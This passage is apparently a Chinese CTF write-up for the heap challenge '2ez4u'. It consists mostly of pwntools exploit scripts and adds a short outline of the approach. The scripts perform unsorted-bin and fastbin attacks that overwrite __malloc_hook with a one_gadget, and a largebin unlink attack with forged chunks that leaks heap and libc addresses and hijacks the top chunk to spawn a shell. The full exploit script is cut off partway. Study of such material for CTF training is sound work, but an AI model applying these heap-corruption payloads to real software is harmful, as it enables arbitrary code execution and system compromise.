    free(1)
    malloc(0,0x100,0,0x78,'dddd')
    show(1)
    ru("description:")
    libc_base = u64(rc(6).ljust(8,'\x00')) - 0x3c4b78
    print "libc_base--->" + hex(libc_base)
    malloc_hook = libc_base + libc.sym["__malloc_hook"]
    realloc = libc_base + libc.sym["realloc"]
    fake_chunk = malloc_hook - 0x43
    onegadget = libc_base + 0xf1147
    free(2)
    free(0)
    malloc(0,0x100,0,0x20,'eeee')
    malloc(0,0x100,0,0x20,'ffff')
    malloc(0,0x100,0,0x100,'eeee')
    malloc(0,0x100,0,0x20,'pppp')
    # debug(0)
    free(2)
    free(0)
    free(1)
    #unsorted bin attack
    malloc(0,0x100,0,0x90,'eeee')
    py = ''
    py += 'a'*0x88
    py += p64(0) + p64(0x71)
    py += p64(0) + p64(malloc_hook-0x50)
    edit(2,0,0,0,py)
    malloc(0,0x100,0,0x50,'hhhh')
    free(1)
    py = ''
    py += 'a'*0x88
    py += p64(0) + p64(0x71)
    py += p64(malloc_hook-0x43)
    edit(2,0,0,0,py)
    malloc(0,0x100,0,0x50,'hhhh')
    py = ''
    py += 'a'*0x13 + p64(onegadget) + p64(realloc+4)
    malloc(0,0x100,0,0x50,py)
    # debug(0xd22)
    ru("your choice: ")
    sl('1')
    ru("color?(0:red, 1:green):")
    sl('0')
    ru("value?(0-999):")
    sl('0')
    ru("num?(0-16):")
    sl('0')
    ru("description length?(1-1024):")
    sl('777')
    ​
    p.interactive()
这里主要讲largebin attack，下面进入正题：
    #!/usr/bin/env python2.7
    # -*- coding: utf-8 -*-    
    from __future__ import print_function
    from pwn import *
    from ctypes import c_uint32
    context.arch = 'x86-64'
    context.os = 'linux'
    context.log_level = 'DEBUG'
    io = process("./2ez4u", env = {"LD_PRELOAD" : "./libc.so"})
    base_addr = 0x0000555555554000
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    def add(l, desc):
        io.recvuntil('your choice:')
        io.sendline('1')
        io.recvuntil('color?(0:red, 1:green):')
        io.sendline('0')
        io.recvuntil('value?(0-999):')
        io.sendline('0')
        io.recvuntil('num?(0-16)')
        io.sendline('0')
        io.recvuntil('description length?(1-1024):')
        io.sendline(str(l))
        io.recvuntil('description of the apple:')
        io.sendline(desc)
        #pass
    def dele(idx):
        io.recvuntil('your choice:')
        io.sendline('2')
        io.recvuntil('which?(0-15):')
        io.sendline(str(idx))
        #pass
    def edit(idx, desc):
        io.recvuntil('your choice:')
        io.sendline('3')
        io.recvuntil('which?(0-15):')
        io.sendline(str(idx))
        io.recvuntil('color?(0:red, 1:green):')
        io.sendline('2')
        io.recvuntil('value?(0-999):')
        io.sendline('1000')
        io.recvuntil('num?(0-16)')
        io.sendline('17')
        io.recvuntil('new description of the apple:')
        io.sendline(desc)
        #pass
    def show(idx):
        io.recvuntil('your choice:')
        io.sendline('4')
        io.recvuntil('which?(0-15):')
        io.sendline(str(idx))
        #pass
    add(0x60,  '0'*0x60 ) #
    add(0x60,  '1'*0x60 ) #
    add(0x60,  '2'*0x60 ) #
    add(0x60,  '3'*0x60 ) #
    add(0x60,  '4'*0x60 ) #
    add(0x60,  '5'*0x60 ) #
    add(0x60,  '6'*0x60 ) #
    add(0x3f0, '7'*0x3f0) # playground
    add(0x30,  '8'*0x30 )
    add(0x3e0, '9'*0x3d0) # sup
    add(0x30,  'a'*0x30 )
    add(0x3f0, 'b'*0x3e0) # victim
    add(0x30,  'c'*0x30 )
    ​
    dele(0x9)
    dele(0xb)
    dele(0x0)
    # debug(0)
    add(0x400, '0'*0x400)
    ​
    # leak
    show(0xb)
    io.recvuntil('num: ')
    print(hex(c_uint32(int(io.recvline()[:-1])).value))
    io.recvuntil('description:')
    HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0
    log.info("heap base 0x%016x" % HEAP)
    target_addr = HEAP+0xb0     # 1
    chunk1_addr = HEAP+0x130    # 2
    chunk2_addr = HEAP+0x1b0    # 3
    victim_addr = HEAP+0xc30    # b
    # large bin attack
    edit(0xb, p64(chunk1_addr))             # victim  bk_nextsize
    edit(0x1, p64(0x0)+p64(chunk1_addr))    # target  
    # debug(0)
    chunk2  = p64(0x0)
    chunk2 += p64(0x0)
    chunk2 += p64(0x421)
    chunk2 += p64(0x0)
    chunk2 += p64(0x0)
    chunk2 += p64(chunk1_addr)   #fd_nextsize
    edit(0x3, chunk2) # chunk2
    # debug(0)
    chunk1  = ''
    chunk1 += p64(0x0)
    chunk1 += p64(0x0)
    chunk1 += p64(0x411)
    chunk1 += p64(target_addr-0x18)
    chunk1 += p64(target_addr-0x10)
    chunk1 += p64(victim_addr)
    chunk1 += p64(chunk2_addr)
    edit(0x2, chunk1) # chunk1
    edit(0x7, '7'*0x198+p64(0x410)+p64(0x411))
    dele(0x6)
    dele(0x3)
    add(0x3f0, '3'*0x30+p64(0xdeadbeefdeadbeef)) # chunk1, arbitrary write !!!!!!!
    add(0x60,  '6'*0x60 ) #
    show(0x3)
    io.recvuntil('3'*0x30)
    io.recv(8)
    LIBC = u64(io.recv(6)+'\x00\x00')-0x3c4be8
    log.info("libc base 0x%016x" % LIBC)
    junk  = ''
    junk += '3'*0x30
    junk += p64(0x81)
    junk += p64(LIBC+0x3c4be8)
    junk += p64(HEAP+0x300)
    junk  = junk.ljust(0xa8, 'A')
    junk += p64(0x80)
    recovery  = ''
    recovery += junk
    recovery += p64(0x80) # 0x4->size
    recovery += p64(0x60) # 0x4->fd
    dele(0x5)
    dele(0x4)
    edit(0x3, recovery) # victim, start from HEAP+0x158
    add(0x60,  '4'*0x60 ) #
    recovery  = ''
    recovery += junk
    recovery += p64(0x70) # 0x4->size
    recovery += p64(0x0) # 0x4->fd
    edit(0x3, recovery) # victim, start from HEAP+0x158
    add(0x40,  '5'*0x30 ) #
    dele(0x5)
    # gdb.attach(io, 'b *0x%x' % (base_addr+0x124e))
    recovery  = ''
    recovery += '3'*0x30
    recovery += p64(0x61)
    recovery += p64(LIBC+0x3c4b50)
    edit(0x3, recovery) # victim, start from HEAP+0x158
    add(0x40,  '5'*0x30 ) #
    add(0x40,  p64(LIBC+0x3c5c50)) #
    # recovery
    edit(0xb, p64(HEAP+0x7e0))
    dele(0x6)
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '/bin/sh') #
    dele(0x1)
    add(0x300, '\x00'*0x1d0+p64(LIBC+0x4526a)) #
    debug(0)
    dele(15)
    ​
    io.interactive()
因为这个程序有0x18的阻拦，所以泄露地址其实有点问题，这里全程采用largebin的方法去做：
利用了largebin的unlink漏洞，大概思路如下：
1、2个largebin的堆块入bin，泄露出bk_nextsize处的堆地址
2、有了堆地址，我们可以伪造fake_largebin_chunk(伪造指针)进行largebin的attack，从而利用堆块重叠，可以泄露出libc地址
3、有了地址，我们再利用UAF漏洞实现fastbin的attack，修改arena上的topchunk地址为free_hook上方，接着再malloc就会从新的topchunk地址处切割，就可以修改free_hook为system，然后free一个binsh的堆块既可getshell
先上完整的exp:
    #!/usr/bin/env python2.7
    # -*- coding: utf-8 -*-    
    from __future__ import print_function
    from pwn import *
    from ctypes import c_uint32
    from pwn import *
    ​
    debug=1
    ​
    context.log_level='debug'
    context.arch='amd64'
    e=ELF('./2ez4u')
    ​
    if debug:
        io=process('./2ez4u')
        libc=e.libc
        # gdb.attach(p)
    else:
        io=remote('',)
    base_addr = 0x0000555555554000
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    def add(l, desc):
        io.recvuntil('your choice:')
        io.sendline('1')
        io.recvuntil('color?(0:red, 1:green):')
        io.sendline('0')
        io.recvuntil('value?(0-999):')
        io.sendline('0')
        io.recvuntil('num?(0-16)')
        io.sendline('0')
        io.recvuntil('description length?(1-1024):')
        io.sendline(str(l))
        io.recvuntil('description of the apple:')
        io.sendline(desc)
        #pass
    def dele(idx):
        io.recvuntil('your choice:')
        io.sendline('2')
        io.recvuntil('which?(0-15):')
        io.sendline(str(idx))
        #pass
    def edit(idx, desc):
        io.recvuntil('your choice:')
        io.sendline('3')
        io.recvuntil('which?(0-15):')
        io.sendline(str(idx))
        io.recvuntil('color?(0:red, 1:green):')
        io.sendline('2')
        io.recvuntil('value?(0-999):')
        io.sendline('1000')
        io.recvuntil('num?(0-16)')
        io.sendline('17')
        io.recvuntil('new description of the apple:')
        io.sendline(desc)
        #pass
    def show(idx):
        io.recvuntil('your choice:')
        io.sendline('4')
        io.recvuntil('which?(0-15):')
        io.sendline(str(idx))
        #pass
    add(0x60,  '0'*0x60 ) #
    add(0x60,  '1'*0x60 ) #
    add(0x60,  '2'*0x60 ) #
    add(0x60,  '3'*0x60 ) #
    add(0x60,  '4'*0x60 ) #
    add(0x60,  '5'*0x60 ) #
    add(0x60,  '6'*0x60 ) #
    add(0x3f0, '7'*0x3f0) # playground
    add(0x30,  '8'*0x30 )
    add(0x3e0, '9'*0x3d0) # sup
    add(0x30,  'a'*0x30 )
    add(0x3f0, 'b'*0x3e0) # victim
    add(0x30,  'c'*0x30 )
    ​
    dele(0x9)
    dele(0xb)
    dele(0x0)
    # debug(0)
    add(0x400, '0'*0x400) #bk_nextsize
    ​
    # leak
    show(0xb)
    io.recvuntil('num: ')
    print(hex(c_uint32(int(io.recvline()[:-1])).value))
    io.recvuntil('description:')
    HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0
    log.info("heap base 0x%016x" % HEAP)
    target_addr = HEAP+0xb0     # 1
    chunk1_addr = HEAP+0x130    # 2
    chunk2_addr = HEAP+0x1b0    # 3
    victim_addr = HEAP+0xc30    # b